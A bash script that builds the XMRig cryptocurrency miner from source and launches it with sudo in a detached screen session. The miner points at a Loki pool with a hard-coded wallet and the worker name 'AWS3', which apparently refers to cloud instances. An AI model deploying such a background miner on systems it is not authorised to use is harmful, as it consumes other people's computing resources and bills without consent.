#!/bin/bash
apt-get update
apt-get --yes --force-yes install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake
apt --yes --force-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
apt --yes --force-yes install software-properties-common
add-apt-repository --yes ppa:jonathonf/gcc-7.1
apt --yes --force-yes install git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake .. -DCUDA_ENABLE=OFF
cmake .. -DOpenCL_ENABLE=OFF
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
make -j$(nproc)
su
script /dev/null
su ubuntu
cd xmrig/build
screen -dm sudo ./xmrig --donate-level 1 -o loki.herominers.com:10111 -u L9yvFcwDHEjjZvnn1YFTQeiERwUzZ1NP369EVaqdry1zWvwy55z34JnekaAhT5RaPC4cbKi5iveVbdDmrFwyAbwcSuhcsyy -p AWS3 -k -a rx/loki
